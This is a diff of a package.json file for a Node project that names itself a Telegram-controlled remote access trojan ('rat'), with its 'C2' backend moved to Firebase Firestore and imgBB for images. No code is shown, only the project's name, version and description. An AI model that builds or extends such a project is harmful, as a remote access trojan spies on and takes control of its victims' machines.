@@ -1,7 +1,7 @@
 {
-  "name": "telegram-firebase-rat",
-  "version": "2.0.0",
-  "description": "Telegram C2 with Firebase Realtime Database",
+  "name": "telegram-firebase-imgbb-rat",
+  "version": "3.0.0",
+  "description": "Telegram C2 with Firebase Firestore and imgBB for images",
   "main": "bot.js",
   "scripts": {
     "start": "node bot.js"
